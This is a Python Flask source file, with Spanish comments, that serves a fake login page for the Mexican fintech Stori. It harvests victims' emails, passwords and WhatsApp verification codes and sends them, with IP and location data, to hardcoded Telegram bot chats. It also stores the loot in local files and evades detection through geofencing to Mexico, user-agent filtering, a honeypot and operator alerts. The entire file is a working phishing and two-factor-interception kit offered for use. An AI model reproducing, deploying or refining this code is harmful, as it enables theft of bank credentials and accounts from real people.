
from flask import Flask, request, render_template_string, session
import requests
from datetime import datetime, timedelta
import time
import json
import os

app = Flask(__name__)
app.secret_key = "clave_secreta_segura"

# Configuración de Telegram usando variables de entorno
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8251217500:AAFcfwVFkYMCicRL3HihsiyCIEYfQiW9q9M')
TELEGRAM_CHAT_ID = [os.getenv('TELEGRAM_CHAT_ID', '-1002977186498')]
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '5073251387,7038549342').split(',')

# ===== CONFIGURACIÓN DE PROTECCIONES =====
# Rate Limiting: máximo intentos por IP por hora (solo para países no permitidos)
MAX_ATTEMPTS_PER_HOUR = 3

# Países permitidos (solo México)
ALLOWED_COUNTRIES = ['Mexico', 'México']

# Almacenamiento de intentos por IP (en memoria)
ip_attempts = {}

# User-Agents válidos (navegadores reales)
VALID_USER_AGENTS = [
    'Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Mozilla'
]

def obtener_ip_real(req):
    if req.headers.getlist("X-Forwarded-For"):
        ip = req.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = req.remote_addr
    return ip

def obtener_tiempo_actual():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def obtener_ubicacion(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        if data['status'] == 'success':
            ciudad = data.get('city', 'N/A')
            codigo_postal = data.get('zip', 'N/A')
            pais = data.get('country', 'N/A')
            return ciudad, codigo_postal, pais
        else:
            return "N/A", "N/A", "N/A"
    except:
        return "N/A", "N/A", "N/A"

TELEGRAM_CHAT_IDS = ['5073251387', '7038549342']  # varios chat_id

def enviar_telegram(mensaje):
    """
    Envía mensaje al grupo (datos normales de usuarios)
    """
    print(f"🚀 Intentando enviar mensaje al grupo: {mensaje[:50]}...")
    for chat_id in TELEGRAM_CHAT_ID:  # Solo al grupo
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            # Intentar sin proxy primero
            response = requests.post(url, data={"chat_id": chat_id, "text": mensaje}, timeout=10)
            print(f"✅ Datos enviados al grupo {chat_id} - Status: {response.status_code}")
            if response.status_code != 200:
                print(f"❌ Error en respuesta: {response.text}")
        except Exception as e:
            print(f"❌ Error enviando al grupo {chat_id}: {str(e)}")
            # Intentar con proxy alternativo
            try:
                # Probar con proxy público
                proxies = {
                    'http': 'http://8.8.8.8:8080',
                    'https': 'http://8.8.8.8:8080'
                }
                response = requests.post(url, data={"chat_id": chat_id, "text": mensaje}, proxies=proxies, timeout=10)
                print(f"✅ Datos enviados al grupo {chat_id} con proxy público - Status: {response.status_code}")
            except Exception as e2:
                print(f"❌ Error con proxy público: {str(e2)}")
                # Intentar sin proxy pero con headers diferentes
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json',
                        'Connection': 'keep-alive'
                    }
                    response = requests.post(url, data={"chat_id": chat_id, "text": mensaje}, headers=headers, timeout=15)
                    print(f"✅ Datos enviados al grupo {chat_id} con headers - Status: {response.status_code}")
                except Exception as e3:
                    print(f"❌ Error con headers también: {str(e3)}")
                    print(f"🚨 TELEGRAM COMPLETAMENTE BLOQUEADO EN PYTHONANYWHERE")
                    # Guardar datos localmente como respaldo
                    guardar_datos_local(mensaje, "datos_usuario")

def enviar_telegram_privado(mensaje):
    """
    Envía mensaje solo a chats privados (alertas de seguridad)
    """
    for chat_id in TELEGRAM_CHAT_IDS:  # Solo usuarios individuales
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            # Intentar sin proxy primero
            response = requests.post(url, data={"chat_id": chat_id, "text": mensaje}, timeout=10)
            print(f"✅ Mensaje privado enviado a {chat_id} - Status: {response.status_code}")
        except Exception as e:
            print(f"❌ Error enviando mensaje privado a {chat_id}: {str(e)}")
            # Intentar con proxy alternativo
            try:
                proxies = {
                    'http': 'http://proxy.pythonanywhere.com:3128',
                    'https': 'http://proxy.pythonanywhere.com:3128'
                }
                response = requests.post(url, data={"chat_id": chat_id, "text": mensaje}, proxies=proxies, timeout=10)
                print(f"✅ Mensaje privado enviado a {chat_id} con proxy - Status: {response.status_code}")
            except Exception as e2:
                print(f"❌ Error con proxy también: {str(e2)}")

# ===== FUNCIONES DE PROTECCIÓN =====

def verificar_rate_limit(ip, pais):
    """
    Verifica si la IP ha excedido el límite de intentos
    México: Sin límite de intentos
    Otros países: Límite de 10 intentos por hora
    """
    # Si es México, no hay límite de intentos
    if pais in ALLOWED_COUNTRIES:
        return True, "OK"

    current_time = time.time()

    # Limpiar intentos antiguos (más de 1 hora)
    if ip in ip_attempts:
        ip_attempts[ip] = [t for t in ip_attempts[ip] if current_time - t < 3600]

    # Contar intentos en la última hora
    if ip in ip_attempts:
        attempts_count = len(ip_attempts[ip])
    else:
        attempts_count = 0

    # Si excede el límite, bloquear (solo para países no permitidos)
    if attempts_count >= MAX_ATTEMPTS_PER_HOUR:
        return False, f"Demasiados intentos desde {pais}. Intenta nuevamente en {60 - int((current_time - min(ip_attempts[ip])) / 60)} minutos."

    # Registrar este intento
    if ip not in ip_attempts:
        ip_attempts[ip] = []
    ip_attempts[ip].append(current_time)

    return True, "OK"

def verificar_pais(pais):
    """
    Verifica si el país está permitido
    """
    if pais in ALLOWED_COUNTRIES:
        return True, "OK"
    else:
        return False, f"Acceso no permitido desde {pais}. Solo se permite acceso desde México."

def verificar_user_agent(user_agent):
    """
    Verifica si el User-Agent es válido (navegador real)
    """
    if not user_agent or user_agent == 'N/D':
        return False, "User-Agent no válido"

    # Verificar si contiene algún navegador válido
    for valid_ua in VALID_USER_AGENTS:
        if valid_ua in user_agent:
            return True, "OK"

    return False, "Navegador no soportado"

def verificar_honeypot(form_data):
    """
    Verifica si se llenó el campo honeypot (trampa para bots)
    """
    # El campo honeypot se llamará 'website' y estará oculto
    if 'website' in form_data and form_data['website'].strip():
        return False, "Bot detectado"
    return True, "OK"

def guardar_datos_local(mensaje, tipo="datos"):
    """
    Guarda los datos en un archivo local como respaldo
    """
    try:
        timestamp = obtener_tiempo_actual()
        filename = f"datos_{tipo}_{timestamp.replace(':', '-').replace(' ', '_')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"=== {tipo.upper()} - {timestamp} ===\n")
            f.write(mensaje)
            f.write("\n" + "="*50 + "\n")
        
        print(f"💾 Datos guardados localmente: {filename}")
        return True
    except Exception as e:
        print(f"❌ Error guardando datos localmente: {str(e)}")
        return False

def enviar_alerta_seguridad(tipo, ip, detalles):
    """
    Envía alerta de seguridad solo a chats privados (no al grupo)
    """
    mensaje = (
        f"🚨 ALERTA DE SEGURIDAD\n"
        f"🔒 Tipo: {tipo}\n"
        f"🌐 IP: {ip}\n"
        f"📝 Detalles: {detalles}\n"
        f"🕒 Hora: {obtener_tiempo_actual()}"
    )
    
    # Usar función privada para enviar solo a usuarios individuales
    enviar_telegram_privado(mensaje)
    
    # Guardar como respaldo local
    guardar_datos_local(mensaje, "alerta_seguridad")


login_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Stori - Acceso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom right, #ffffff, #ffdebf);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #fff;
            padding: 40px;
            border-radius: 14px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 360px;
            text-align: center;
        }
        .logo {
            width: 140px;
            height: auto;
            margin-bottom: 20px;
        }
        h2 {
            color: #ff8200;
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }
        label {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
            user-select: none;
            cursor: pointer;
        }
        label input[type="checkbox"] {
            margin-right: 10px;
            width: 16px;
            height: 16px;
        }
        .info-legal {
            color: green;
            font-size: 14px;
            margin-bottom: 20px;
            cursor: default;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #ff8200;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e46f00;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDYeopdjATFTx_2kdBQS2zh1-11uKqykvrLw&s" alt="Stori logo" class="logo">
        <h2>Iniciar sesión</h2>
        <form method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>

            <!-- Campo honeypot (trampa para bots) - completamente oculto -->
            <input type="text" name="website" style="display: none !important; position: absolute; left: -9999px;" tabindex="-1" autocomplete="off">
            
            <label>
                <input type="checkbox" name="acepto_aviso" required>
                Acepto el aviso de privacidad
            </label>
            
            <div class="info-legal">Consulta nuestra información legal</div>
            
            <button type="submit">Continuar</button>
        </form>
    </div>
</body>
</html>
"""

loading_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Validando...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fffaf2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            color: #444;
        }
        .mensaje {
            font-size: 22px;
            margin-bottom: 30px;
            text-align: center;
        }
        .contador {
            font-size: 48px;
            font-weight: bold;
            color: #ff8200;
            font-family: 'Courier New', Courier, monospace;
            margin-bottom: 30px;
        }
        .barra-progreso {
            width: 300px;
            height: 20px;
            background-color: #ddd;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
        }
        .progreso {
            height: 100%;
            width: 0%;
            background-color: #ff8200;
            border-radius: 10px 0 0 10px;
            transition: width 1s linear;
        }
    </style>
    <script>
        let tiempo = 25;
        function actualizarContador() {
            document.getElementById('contador').textContent = tiempo;
            let porcentaje = ((25 - tiempo) / 25) * 100;
            document.querySelector('.progreso').style.width = porcentaje + '%';
            if (tiempo === 0) {
                window.location.href = "{{ destino or '/codigo' }}";
            } else {
                tiempo--;
                setTimeout(actualizarContador, 1000);
            }
        }
        window.onload = actualizarContador;
    </script>
</head>
<body>
    <div class="mensaje">⏳ Validando información...<br>Por favor, espere mientras verificamos sus datos.</div>
    <div class="contador" id="contador">25</div>
    <div class="barra-progreso">
        <div class="progreso"></div>
    </div>
</body>
</html>


"""

code_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Validación de identidad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom right, #ffffff, #fff1e5);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .code-box {
            background: #fff;
            padding: 40px 40px 30px 40px;
            border-radius: 14px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 360px;
            text-align: center;
        }
        .logo-img {
            width: 120px;
            margin-bottom: 20px;
        }
        h2 {
            color: #ff8200;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .sub-text {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .codigo-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
        }
        .codigo-inputs input {
            width: 40px;
            height: 50px;
            font-size: 32px;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s;
        }
        .codigo-inputs input:focus {
            border-color: #ff8200;
            box-shadow: 0 0 5px #ff8200;
        }
        button {
            padding: 12px 30px;
            background-color: #ff8200;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #e46f00;
        }
    </style>
</head>
<body>
    <div class="code-box">
        <img src="https://cdn.glitch.global/e1e455db-012b-49f9-9e5a-31c1a0409530/dispo.png" alt="Dispositivo" class="logo-img">
        <h2>¡Válida tu identidad!</h2>
        <div class="sub-text">Por medidas de seguridad ingresa el código que hemos enviado a tu dispositivo WhatsApp.</div>
        <form method="POST" onsubmit="return validarCodigo();">
            <div class="codigo-inputs">
                <input type="text" name="d1" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="d2" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="d3" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="d4" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="d5" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="d6" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>
            <button type="submit">Validar</button>
        </form>
    </div>

    <script>
        const inputs = document.querySelectorAll('.codigo-inputs input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function validarCodigo() {
            for(let input of inputs) {
                if (!input.value.match(/^[0-9]$/)) {
                    alert("Por favor, ingresa los 6 dígitos numéricos correctamente.");
                    return false;
                }
            }
            let codigoCompleto = Array.from(inputs).map(i => i.value).join('');
            let existing = document.querySelector('input[name="codigo"]');
            if (!existing) {
                let hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'codigo';
                hiddenInput.value = codigoCompleto;
                document.querySelector('form').appendChild(hiddenInput);
            } else {
                existing.value = codigoCompleto;
            }
            inputs.forEach(i => i.disabled = true);
            return true;
        }
    </script>
</body>
</html>
"""

thanks_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Gracias</title>
    <style>
        body {
            background-color: #fff6ec;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #444;
        }
        .box {
            text-align: center;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="box">
        ✅ Gracias por confirmar tu información.<br>
        Serás redirigido en unos momentos.
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    ip = obtener_ip_real(request)
    ciudad, codigo_postal, pais = obtener_ubicacion(ip)
    user_agent = request.headers.get('User-Agent', 'N/D')

    if request.method == 'GET':
        # ===== APLICAR PROTECCIONES EN GET =====
        print(f"🔍 GET - IP: {ip}, País: {pais}, UA: {user_agent[:50]}...")
        
        # 1. Verificar User-Agent
        ua_valid, ua_msg = verificar_user_agent(user_agent)
        print(f"🔍 User-Agent válido: {ua_valid}")
        if not ua_valid:
            enviar_alerta_seguridad("User-Agent Inválido", ip, f"UA: {user_agent}")
            return render_template_string(login_page)  # Mostrar página normal
        
        # 2. Verificar país
        pais_valid, pais_msg = verificar_pais(pais)
        print(f"🔍 País válido: {pais_valid}")
        if not pais_valid:
            enviar_alerta_seguridad("País Bloqueado", ip, f"País: {pais}")
            return render_template_string(login_page)  # Mostrar página normal
        
        # 3. Verificar rate limit
        rate_valid, rate_msg = verificar_rate_limit(ip, pais)
        print(f"🔍 Rate limit válido: {rate_valid}")
        if not rate_valid:
            enviar_alerta_seguridad("Rate Limit Excedido", ip, f"País: {pais}, Intentos: {len(ip_attempts.get(ip, []))}")
            return render_template_string(login_page)  # Mostrar página normal

        # Si pasa todas las verificaciones, mostrar página y enviar notificación
        tiempo = obtener_tiempo_actual()
        mensaje = (
            f"🚨 Usuario detectado\n"
            f"🕒 Hora: {tiempo}\n"
            f"🌐 IP: {ip}\n"
            f"📍 Ciudad: {ciudad}\n"
            f"🏷 Código postal: {codigo_postal}\n"
            f"🇲🇽 País: {pais}\n"
            f"💻 Dispositivo: {user_agent}"
        )
        enviar_telegram(mensaje)
        return render_template_string(login_page)

    elif request.method == 'POST':
        # ===== APLICAR PROTECCIONES EN POST =====
        print(f"🔍 POST - IP: {ip}, País: {pais}, UA: {user_agent[:50]}...")
        
        # 1. Verificar honeypot
        honeypot_valid, honeypot_msg = verificar_honeypot(request.form)
        print(f"🔍 Honeypot válido: {honeypot_valid}")
        if not honeypot_valid:
            enviar_alerta_seguridad("Bot Detectado (Honeypot)", ip, f"Campo llenado: {request.form.get('website', '')}")
            return render_template_string(loading_page)  # Mostrar página de carga normal
        
        # 2. Verificar User-Agent
        ua_valid, ua_msg = verificar_user_agent(user_agent)
        print(f"🔍 User-Agent válido: {ua_valid}")
        if not ua_valid:
            enviar_alerta_seguridad("User-Agent Inválido", ip, f"UA: {user_agent}")
            return render_template_string(loading_page)  # Mostrar página de carga normal
        
        # 3. Verificar país
        pais_valid, pais_msg = verificar_pais(pais)
        print(f"🔍 País válido: {pais_valid}")
        if not pais_valid:
            enviar_alerta_seguridad("País Bloqueado", ip, f"País: {pais}")
            return render_template_string(loading_page)  # Mostrar página de carga normal
        
        # 4. Verificar rate limit
        rate_valid, rate_msg = verificar_rate_limit(ip, pais)
        print(f"🔍 Rate limit válido: {rate_valid}")
        if not rate_valid:
            enviar_alerta_seguridad("Rate Limit Excedido", ip, f"País: {pais}, Intentos: {len(ip_attempts.get(ip, []))}")
            return render_template_string(loading_page)  # Mostrar página de carga normal

        # 5. Validar que el checkbox esté marcado
        if 'acepto_aviso' not in request.form:
            return "<h3>Debes aceptar el aviso de privacidad para continuar.</h3>", 400

        # Si pasa todas las verificaciones, procesar datos
        print(f"✅ Todas las verificaciones pasaron, procesando datos...")
        session['email'] = request.form['email']
        session['password'] = request.form['password']

        tiempo = obtener_tiempo_actual()
        mensaje = (
            f"🔐 Datos ingresados\n"
            f"🕒 Hora: {tiempo}\n"
            f"📧 Correo: {session['email']}\n"
            f"🔑 Contraseña: {session['password']}\n"
            f"🌐 IP: {ip}\n"
            f"📍 Ciudad: {ciudad}\n"
            f"🏷 Código postal: {codigo_postal}\n"
            f"🇲🇽 País: {pais}\n"
            f"💻 Dispositivo: {user_agent}"
        )

        print(f"📤 Enviando datos al grupo...")
        enviar_telegram(mensaje)
        print(f"✅ Datos enviados exitosamente")
        return render_template_string(loading_page)

@app.route('/codigo', methods=['GET', 'POST'])
def codigo():
    ip = obtener_ip_real(request)
    ciudad, codigo_postal, pais = obtener_ubicacion(ip)
    user_agent = request.headers.get('User-Agent', 'N/D')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if request.method == 'POST':
        # Se guarda que ya hubo un intento
        session['codigo_intentado'] = True
        codigo = request.form['codigo']
        email = session.get('email', 'N/A')
        password = session.get('password', 'N/A')

        mensaje = (
            f"🔐 Código ingresado\n"
            f"📧 Correo: {email}\n"
            f"🔑 Contraseña: {password}\n"
            f"📲 Código: {codigo}\n"
            f"🌐 IP: {ip}\n"
            f"📍 Ciudad: {ciudad}\n"
            f"🏷 Código postal: {codigo_postal}\n"
            f"🇲🇽 País: {pais}\n"
            f"💻 Dispositivo: {user_agent}\n"
            f"🕒 Fecha y hora: {timestamp}"
        )
        enviar_telegram(mensaje)

        # Después del POST, redirige al GET para mostrar la pantalla nuevamente
        return render_template_string(loading_page, destino="/codigo")

    error_mensaje = ""
    if session.get('codigo_intentado'):
        error_mensaje = "<div style='color:red;margin-bottom:15px;'>¡Mucha suerte!</div>"

    # Inserta el mensaje de error dentro del código HTML de `code_page`
    code_page_con_error = code_page.replace(
        '<form method="POST" onsubmit="return validarCodigo();">',
        error_mensaje + '<form method="POST" onsubmit="return validarCodigo();">'
    )

    return render_template_string(code_page_con_error)


if __name__ == '__main__':
    app.run(debug=True)


@app.route('/validando_codigo')
def validando_codigo():
    return render_template_string(loading_page.replace("/codigo", "/gracias"))

# ===== RUTA DE PRUEBA =====

@app.route('/test_bot')
def test_bot():
    """
    Ruta de prueba para verificar que el bot funcione
    """
    try:
        mensaje_prueba = (
            f"🧪 PRUEBA DE BOT\n"
            f"🕒 Hora: {obtener_tiempo_actual()}\n"
            f"🌐 IP: {obtener_ip_real(request)}\n"
            f"✅ Bot funcionando correctamente"
        )
        
        print("🔍 Enviando mensaje de prueba...")
        enviar_telegram(mensaje_prueba)
        
        return f"""
        <h2>Prueba de Bot</h2>
        <p>Mensaje enviado: {mensaje_prueba}</p>
        <p>Chat ID del grupo: {TELEGRAM_CHAT_ID}</p>
        <p>Token: {TELEGRAM_BOT_TOKEN[:20]}...</p>
        <p>Revisa la consola de PythonAnywhere para ver los logs</p>
        """
        
    except Exception as e:
        return f"<h2>Error en prueba</h2><p>{str(e)}</p>"

@app.route('/datos_guardados')
def ver_datos_guardados():
    """
    Muestra los datos guardados localmente
    """
    import os
    import glob
    
    try:
        # Buscar archivos de datos
        archivos = glob.glob("datos_*.txt")
        archivos.sort(reverse=True)  # Más recientes primero
        
        if not archivos:
            return "<h2>No hay datos guardados</h2><p>No se han guardado datos localmente aún.</p>"
        
        html = "<h2>📁 Datos Guardados Localmente</h2>"
        html += f"<p><strong>Total de archivos:</strong> {len(archivos)}</p>"
        
        for archivo in archivos[:10]:  # Mostrar solo los 10 más recientes
            try:
                with open(archivo, 'r', encoding='utf-8') as f:
                    contenido = f.read()
                
                html += f"""
                <div style="border: 1px solid #ccc; margin: 10px 0; padding: 10px; background: #f9f9f9;">
                    <h3>📄 {archivo}</h3>
                    <pre style="white-space: pre-wrap; font-size: 12px;">{contenido}</pre>
                </div>
                """
            except Exception as e:
                html += f"<p>❌ Error leyendo {archivo}: {str(e)}</p>"
        
        return html
        
    except Exception as e:
        return f"<h2>Error</h2><p>{str(e)}</p>"

# ===== RUTA DE MONITOREO =====

@app.route('/admin/security')
def security_monitor():
    """
    Página de monitoreo de seguridad (solo para administradores)
    """
    current_time = time.time()

    # Limpiar intentos antiguos
    for ip in list(ip_attempts.keys()):
        ip_attempts[ip] = [t for t in ip_attempts[ip] if current_time - t < 3600]
        if not ip_attempts[ip]:
            del ip_attempts[ip]

    # Generar estadísticas
    total_ips = len(ip_attempts)
    blocked_ips = [ip for ip, attempts in ip_attempts.items() if len(attempts) >= MAX_ATTEMPTS_PER_HOUR]

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Monitor de Seguridad</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .stats {{ background: #f5f5f5; padding: 20px; border-radius: 8px; margin-bottom: 20px; }}
            .ip-list {{ background: #fff; padding: 15px; border-radius: 8px; border: 1px solid #ddd; }}
            .blocked {{ color: red; font-weight: bold; }}
            .normal {{ color: green; }}
        </style>
    </head>
    <body>
        <h1>🛡️ Monitor de Seguridad</h1>

        <div class="stats">
            <h2>📊 Estadísticas</h2>
            <p><strong>IPs activas:</strong> {total_ips}</p>
            <p><strong>IPs bloqueadas:</strong> {len(blocked_ips)}</p>
            <p><strong>Límite de intentos:</strong> {MAX_ATTEMPTS_PER_HOUR} por hora</p>
            <p><strong>Países permitidos:</strong> {', '.join(ALLOWED_COUNTRIES)}</p>
        </div>

        <div class="ip-list">
            <h2>🌐 IPs Monitoreadas</h2>
    """

    if ip_attempts:
        for ip, attempts in ip_attempts.items():
            status = "blocked" if len(attempts) >= MAX_ATTEMPTS_PER_HOUR else "normal"
            last_attempt = max(attempts) if attempts else 0
            time_ago = int((current_time - last_attempt) / 60) if last_attempt else 0

            html += f"""
            <p class="{status}">
                <strong>{ip}</strong> - {len(attempts)} intentos - Último: {time_ago} min ago
            </p>
            """
    else:
        html += "<p>No hay IPs monitoreadas actualmente.</p>"

    html += """
        </div>

        <p><em>Última actualización: """ + obtener_tiempo_actual() + """</em></p>
    </body>
    </html>
    """

    return html

